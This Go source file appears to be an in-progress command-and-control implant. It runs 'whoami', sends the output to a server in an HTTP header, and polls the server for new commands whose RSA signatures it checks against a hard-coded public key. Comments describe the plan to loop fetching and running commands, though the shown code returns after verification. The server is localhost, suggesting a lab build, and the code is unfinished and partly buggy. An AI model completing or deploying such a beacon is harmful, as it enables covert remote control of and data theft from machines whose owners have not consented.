package main

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	//"encoding/hex"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"
	"uuid"
)

func main() {
	// We needed the \n in the public key otherwise we get a segfault
	// This block handles turning the public key from this raw data to something usable
	// https://blog.cubieserver.de/2016/go-verify-cryptographic-signatures/
	const rawPubKey = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4pz/Qsw7oDtdwT857JcsGU4KWHFi+OgnFbK02BwF82mlESwn9znXldI9guEYW476XvgfMTNP0reGxle+BmIn+AujJ/QF7gQtZ2W/QCZPaOK2sbphRNfaY4zlb8qLrCvsZ4K5SGpyY7U/skyF1lPIW1Og6N+HY8+eSG9xzzGl/SfAjaIhyBT1g94jFtZty9NYXNevdLwdU8OhU1/IzmQU2jG225vZgF0lvbkrVgTLV+iVKqQt1NsLqh141II6UEqZuEHvKtuclbJLTxKSF2uNBCPILDhv8zIqq0K6368hQ8P7FAPoQK96pjx4UwviMG+RSZfa/T7h5tKJNM3cVz3NTwIDAQAB\n-----END PUBLIC KEY-----"
	//test_var := []byte("pwd")
	block, _ := pem.Decode([]byte(rawPubKey))
	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	//publicKey := key.(*rsa.PublicKey)

	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}
	sb1 := "whoami"

	cmd := exec.Command(sb1)
	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors

	result, _ := cmd.Output()
	toSend := string(result)
	toSend = strings.Replace(toSend, "\n", "", -1)
	fmt.Printf(toSend + "\n")

	//time.Sleep(10)
	req, err := http.NewRequest("GET", "http://localhost:8000/", nil)
	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
	for true {
		// current issue is that we're not retrieving and executing the new ocmmand
		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		//body = string(body)
		//fmt.Printf(body)
		//statusC := resp.Status
		if err != nil {
			log.Fatalln(err)
		}

		//encoded,_ := base64.StdEncoding.DecodeString(body)
		//Convert the body to type string
		sb := string(body)
		for sb == "0" {
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
		}
		fmt.Printf(sb + "\n")
		hashed := sha256.Sum256(body)
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		rawSignature := resp.Header.Get("Verifier")
		//b64_sig,_ := base64.StdEncoding.DecodeString(rawSignature)
		fmt.Printf(rawSignature + "\n")
		//hex_sig, _ := hex.DecodeString(rawSignature)
		signature := []byte(rawSignature)
		//signature, err = base64.StdEncoding.DecodeString(rawSignature)
		//hash := sha1.Sum(sb)
		//h := hash[:]
		//h := sha256.New()
		//h.Write([]byte(sb))
		//err = rsa.VerifyPKCS1v15(key.(*rsa.PublicKey), crypto.SHA1, h.Sum(nil), signature)
		// The issue was PSS vs PKCS1v15
		fmt.Printf("Verifying sig")
		err2 := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature)
		if err2 != nil {
			fmt.Println(err2)
			return
		}

		fmt.Println("Successfully verified message with signature and public key")
		return

	}
}
